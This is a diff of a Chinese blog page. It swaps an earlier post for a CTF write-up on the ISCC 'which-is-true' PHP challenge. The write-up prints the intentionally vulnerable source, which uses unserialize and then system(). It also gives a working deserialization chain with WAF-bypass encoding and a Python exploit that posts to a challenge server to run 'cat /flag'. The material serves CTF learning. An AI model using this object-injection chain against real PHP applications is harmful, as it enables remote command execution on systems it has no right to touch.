@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="十三届easyphp, Hexo">
+    <meta name="keywords" content="which-is-true-iscc, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>十三届easyphp | Hexo</title>
+    <title>which-is-true-iscc | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">十三届easyphp</h1>
+                    <h1 class="description center-align post-title">which-is-true-iscc</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-04
+                    2021-05-05
                 </div>
                 
 
@@ -464,34 +464,397 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <a id="more"></a>
+                <p>#前言</p>
+<a id="more"></a>
 
+<p>源码</p>
 <pre><code>&lt;?php
 
-$pid=pcntl_fork();
+session_start();
+ini_set(&#39;max_execution_time&#39;, &#39;5&#39;);
+set_time_limit(5);
 
-if($pid==-1)
-    die(&#39;could not fork&#39;);
-else if($pid==1)&#123;
-    $r=pcntl_wait($status);
-    if(!pcntl_wifexited($status))&#123;
-        phpinfo();
+$status = &quot;new&quot;;
+$cmd = &quot;whoami&quot;;
+$is_upload = false;
+$is_unser_finished = false;
+$iscc_file = NULL;
+
+class ISCC_Upload &#123;
+
+    function __wakeup() &#123;
+        global $cmd;
+        global $is_upload;
+        $cmd = &quot;whoami&quot;;
+        $_SESSION[&#39;name&#39;] = randstr(14);
+        $is_upload = (count($_FILES) &gt; 0);
+&#125;
+
+function __destruct() &#123;
+    global $is_upload;
+    global $status;
+    global $iscc_file;
+    $status = &quot;upload_fail&quot;;
+    if ($is_upload) &#123;
+
+        foreach ($_FILES as $key =&gt; $value)
+            $GLOBALS[$key] = $value;
+
+
+        if(is_uploaded_file($iscc_file[&#39;tmp_name&#39;])) &#123;
+
+            $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]);
+
+            if($check !== false) &#123;
+
+                $target_dir = &quot;/var/tmp/&quot;;
+                $target_file = $target_dir . randstr(10);
+
+                if (file_exists($target_file)) &#123;
+                    echo &quot;想啥呢？有东西了……&lt;br&gt;&quot;;
+                    finalize();
+                    exit;
+                &#125;
+
+                if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123;
+                    echo &quot;东西塞不进去~&lt;br&gt;&quot;;
+                    finalize();
+                    exit;
+                &#125;
+
+                if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123;
+                    echo &quot;我拿到了！&lt;br&gt;&quot;;
+                    $iscc_file = $target_file;
+                    $status = &quot;upload_ok&quot;;
+                &#125; else &#123;
+                    echo &quot;拿不到:(&lt;br&gt;&quot;;
+                    finalize();
+                    exit;
+                &#125;
+
+            &#125; else &#123;
+                finalize();
+                exit;
+            &#125;
+
+        &#125; else &#123;
+            echo &quot;你真是个天才!&lt;br&gt;&quot;;
+            finalize();
+            exit;
+        &#125;
     &#125;
 &#125;
-else&#123;
-    highlight_file(__FILE__);
-    if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;]))&#123;
-        call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);
-    &#125;
-    posix_kill(posix_getpid(),SIGUSR1);
 &#125;
 
-?&gt; </code></pre>
-<p>题目源码</p>
-<p>如果父进程先退出，造成了子进程被init接管，所以子进程为一，所以我们要做的就是怎么让父进程退出</p>
-<blockquote>
-<p>pcntl_wait 等待或返回子进程的状态<br>pcntl_wifexited  获取状态值</p>
-</blockquote>
+class ISCC_ResetCMD &#123;
+
+protected $new_cmd = &quot;echo &#39;新新世界，发号施令!&#39;&quot;;
+
+function __wakeup() &#123;
+    global $cmd;
+    global $is_upload;
+    global $status;
+    $_SESSION[&#39;name&#39;] = randstr(14);
+    $is_upload = false;
+
+    if(!isset($this-&gt;new_cmd)) &#123;
+        $status = &quot;error&quot;;
+        $error = &quot;你这罐子是空的!&quot;;
+        throw new Exception($error);
+    &#125;
+
+    if(!is_string($this-&gt;new_cmd)) &#123;
+        $status = &quot;error&quot;;
+        $error = &#39;东西都没给对!&#39;;
+        throw new Exception($error);
+    &#125;
+&#125;
+
+function __destruct() &#123;
+    global $cmd;
+    global $status;
+    $status = &quot;reset&quot;;
+    if($_SESSION[&#39;name&#39;] === &#39;isccIsCciScc1scc&#39;) &#123;
+        $cmd = $this-&gt;new_cmd;
+    &#125;
+&#125;
+
+&#125;
+
+class ISCC_Login &#123;
+
+function __wakeup() &#123;
+    $this-&gt;login();
+&#125;
+
+function __destruct() &#123;
+    $this-&gt;logout();
+&#125;
+
+function login() &#123;
+    $flag = file_get_contents(&quot;/flag&quot;);
+    $pAssM0rd = hash(&quot;sha256&quot;, $flag);
+    if($_GET[&#39;pAssM0rd&#39;] === $pAssM0rd)
+        $_SESSION[&#39;name&#39;] = &quot;isccIsCciScc1scc&quot;;
+&#125;
+
+function logout() &#123;
+    global $status;
+    unset($_SESSION[&#39;name&#39;]);
+    $status = &quot;finish&quot;;
+&#125;
+
+&#125;
+
+class ISCC_TellMeTruth &#123;
+
+function __wakeup() &#123;
+    if(!isset($_SESSION[&#39;name&#39;]))
+        $_SESSION[&#39;name&#39;] = randstr(14);
+    echo &quot;似乎这个 &quot;.$_SESSION[&#39;name&#39;].&quot; 是真相&lt;br&gt;&quot;;
+&#125;
+
+function __destruct() &#123;
+    echo &quot;似乎这个 &quot;.$_SESSION[&#39;name&#39;].&quot; 是真相&lt;br&gt;&quot;;
+&#125;
+
+&#125;
+
+class ISCC_Command &#123;
+
+function __wakeup() &#123;
+    global $cmd;
+    global $is_upload;
+    $_SESSION[&#39;name&#39;] = randstr(14);
+    $is_upload = false;
+    $cmd = &quot;whoami&quot;;
+&#125;
+
+function __toString() &#123;
+    global $cmd;
+    return &quot;看看你干的好事: &#123;$cmd&#125; &lt;br&gt;&quot;;
+&#125;
+
+function __destruct() &#123;
+    global $cmd;
+    global $status;
+    global $is_unser_finished;
+    $status = &quot;cmd&quot;;
+    if($is_unser_finished === true) &#123;
+        echo &quot;看看你干的 [&lt;span style=&#39;color:red&#39;&gt;&#123;$cmd&#125;&lt;/span&gt;] 弄出了什么后果: &quot;;
+        echo &quot;&lt;span style=&#39;color:blue&#39;&gt;&quot;;
+        @system($cmd);
+        echo &quot;&lt;/span&gt;&quot;;
+    &#125;
+&#125;
+
+&#125;
+
+function randstr($len)
+&#123;
+$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#39;;
+$randstring = &#39;&#39;;
+for ($i = 0; $i &lt; $len; $i++) &#123;
+    $randstring .= $characters[rand(0, strlen($characters))];
+&#125;
+return $randstring;
+&#125;
+
+function waf($s) &#123;
+if(stripos($s, &quot;*&quot;) !== FALSE)
+    return false;
+return true;
+&#125;
+
+function finalize() &#123;
+$cmd = &quot;&quot;;
+$is_upload = false;
+unset($_SESSION);
+@unlink($iscc_file);
+$status = &quot;finish&quot;;
+echo &quot;&lt;img src=&#39;whichisthetrueiscc.gif&#39;&gt;&lt;br&gt;&quot;;
+&#125;
+
+
+if(isset($_GET[&#39;whatareyounongshane&#39;])) &#123;
+$whatareyounongshane = $_GET[&#39;whatareyounongshane&#39;];
+switch ($whatareyounongshane) &#123;
+    case &quot;src&quot;:
+        highlight_file(__FILE__);
+        break;
+    case &quot;cmd&quot;:
+        echo &quot;想越级干好事？还是有门的……&quot;;
+        header(&#39;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#39;);
+        break;
+    case &quot;reset&quot;:
+        echo &quot;几辈子积累的好运就在这时~:p&quot;;
+        header(&#39;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#39;);
+        break;
+    case &quot;upload&quot;:
+        $resp = &lt;&lt;&lt;EOF
+&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+  &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+&lt;/form&gt;
+EOF;
+        echo $resp;
+        break;
+    case &quot;tellmetruth&quot;:
+        echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;);
+        header(&#39;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#39;);
+        break;
+    default:
+        echo &quot;空空如也就是我！&quot;;
+&#125;
+finalize();
+die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);
+&#125;
+
+if(isset($_GET[&#39;?&#39;])) &#123;
+
+$wtf = waf($_GET&#123;&#39;?&#39;&#125;) ? $_GET[&#39;?&#39;] : (finalize() &amp;&amp; die(&quot;试试就“逝世”!&quot;));
+
+if($goodshit = @unserialize($wtf)) &#123;
+    $is_unser_finished = true;
+&#125;
+
+if(in_array($status, array(&#39;new&#39;, &#39;cmd&#39;, &#39;upload_ok&#39;, &#39;upload_fail&#39;, &#39;reset&#39;), true))
+    finalize();
+die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);
+&#125;
+
+?&gt;</code></pre>
+<p>说实话这个源码一下子都给我看害怕了这也太长了吧。。。。</p>
+<p>先找到漏洞在得地方</p>
+<pre><code>class ISCC_Command &#123;
+
+function __wakeup() &#123;
+    global $cmd;
+    global $is_upload;
+    $_SESSION[&#39;name&#39;] = randstr(14);
+    $is_upload = false;
+    $cmd = &quot;whoami&quot;;
+&#125;
+
+function __toString() &#123;
+    global $cmd;
+    return &quot;看看你干的好事: &#123;$cmd&#125; &lt;br&gt;&quot;;
+&#125;
+
+function __destruct() &#123;
+    global $cmd;
+    global $status;
+    global $is_unser_finished;//10,247
+    $status = &quot;cmd&quot;;
+    if($is_unser_finished === true) &#123;
+        echo &quot;看看你干的 [&lt;span style=&#39;color:red&#39;&gt;&#123;$cmd&#125;&lt;/span&gt;] 弄出了什么后果: &quot;;
+        echo &quot;&lt;span style=&#39;color:blue&#39;&gt;&quot;;
+        @system($cmd);
+        echo &quot;&lt;/span&gt;&quot;;
+    &#125;
+&#125;
+
+&#125;</code></pre>
+<p>我们是想找到我们想要的flag，所以我们就应该改变cmd得值，cmd是一个全局变量，所以尝试查找哪里cmd得值发生改变</p>
+<pre><code>class ISCC_ResetCMD &#123;
+
+protected $new_cmd = &quot;echo &#39;新新世界，发号施令!&#39;&quot;;
+
+function __wakeup() &#123;
+    global $cmd;
+    global $is_upload;
+    global $status;
+    $_SESSION[&#39;name&#39;] = randstr(14);
+    $is_upload = false;
+
+    if(!isset($this-&gt;new_cmd)) &#123;
+        $status = &quot;error&quot;;
+        $error = &quot;你这罐子是空的!&quot;;
+        throw new Exception($error);   
+    &#125;
+
+    if(!is_string($this-&gt;new_cmd)) &#123;
+        $status = &quot;error&quot;;
+        $error = &#39;东西都没给对!&#39;;
+        throw new Exception($error);
+    &#125;
+&#125;
+
+function __destruct() &#123;
+    global $cmd;
+    global $status;
+    $status = &quot;reset&quot;;
+    if($_SESSION[&#39;name&#39;] === &#39;isccIsCciScc1scc&#39;) &#123;
+        $cmd = $this-&gt;new_cmd;
+    &#125;
+&#125;
+
+&#125;</code></pre>
+<p>应该是这里发生了变化，我们可以通过改变new_cmd来改变cmd，但是改变new_cmd得值需要我们使得$_SESSION[‘name’]=isccIsCciScc1scc，所以我们现在要做的就是怎么改变$_SESSION[‘name’]，因为初始得时候session得值是14位随机数</p>
+<pre><code>class ISCC_Login &#123;
+
+function __wakeup() &#123;
+    $this-&gt;login();
+&#125;
+
+function __destruct() &#123;
+    $this-&gt;logout();
+&#125;
+
+function login() &#123;
+    $flag = file_get_contents(&quot;/flag&quot;);
+    $pAssM0rd = hash(&quot;sha256&quot;, $flag);
+    if($_GET[&#39;pAssM0rd&#39;] === $pAssM0rd)
+        $_SESSION[&#39;name&#39;] = &quot;isccIsCciScc1scc&quot;;
+&#125;
+
+function logout() &#123;
+    global $status;
+    unset($_SESSION[&#39;name&#39;]);
+    $status = &quot;finish&quot;;
+&#125;
+
+&#125;</code></pre>
+<p>这里给人一种很明显得错觉，但是，我能发现的就是logout这个方法，有一个unset函数用于销毁变量，如果我们一旦使用这个类，我们得这个变量就没有了，所以一定不能调用这个类</p>
+<p>做到这里我就卡住了</p>
+<p>参考feng师傅得文章，说是可以在这个类中</p>
+<p><img src="1.PNG"></p>
+<p>现在开始构造链</p>
+<pre><code>&lt;?php
+class ISCC_Command &#123;
+
+&#125;
+class ISCC_ResetCMD &#123;
+
+    protected $new_cmd = &quot;cat /flag&quot;;
+
+&#125;
+class ISCC_Upload &#123;
+&#125;
+$a=array(
+    &#39;a&#39;=&gt;new ISCC_Upload(),
+    &#39;b&#39;=&gt;new ISCC_ResetCMD(),
+    &#39;c&#39;=&gt;new ISCC_Command(),
+);
+$b=urlencode(serialize($a));
+$b=str_replace(&quot;s&quot;,&quot;S&quot;,$b);
+$b=str_replace(&quot;%2A&quot;,&#39;\2a&#39;,$b);
+echo $b;</code></pre>
+<p>接下来就是$_FILES的处理了。</p>
+<pre><code>import requests
+
+url=&quot;http://39.96.91.106:7050/&quot;
+
+files=&#123;
+    &#39;iscc_file&#39;:(&quot;b&quot;,open(&quot;1.jpg&quot;,&quot;rb&quot;)),
+    &quot;_SESSION&quot;:(&quot;isccIsCciScc1scc&quot;,&quot;123&quot;)
+&#125;
+headers=&#123;
+    &#39;Cookie&#39;:&quot;XDEBUG_SESSION=PHPSTORM&quot;
+&#125;
+r=requests.post(url=url+&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;,files=files,headers=headers)
+
+print(r.text)</code></pre>
 
                 
             </div>
@@ -518,7 +881,7 @@ else&#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ckylsy.github.io/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/">http://ckylsy.github.io/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/</a>
+                    <a href="http://ckylsy.github.io/2021/05/05/which-is-true-iscc/">http://ckylsy.github.io/2021/05/05/which-is-true-iscc/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -725,29 +1088,30 @@ else&#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/05/04/pcntl-fork/">
+                <a href="/2021/05/05/which-is-true-iscc/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="pcntl_fork">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="which-is-true-iscc">
                         
-                        <span class="card-title">pcntl_fork</span>
+                        <span class="card-title">which-is-true-iscc</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            #前言
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -756,6 +1120,7 @@ else&#123;
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -766,24 +1131,24 @@ else&#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/04/0ctf-piapiapia/">
+                <a href="/2021/05/05/%E5%91%A8%E8%AE%B01/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="0ctf-piapiapia">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="周记1">
                         
-                        <span class="card-title">0ctf-piapiapia</span>
+                        <span class="card-title">周记1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            #前言又是一道代码审计的题目。。。。
+                            #前言
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-05
                             </span>
                         <span class="publish-author">
                             
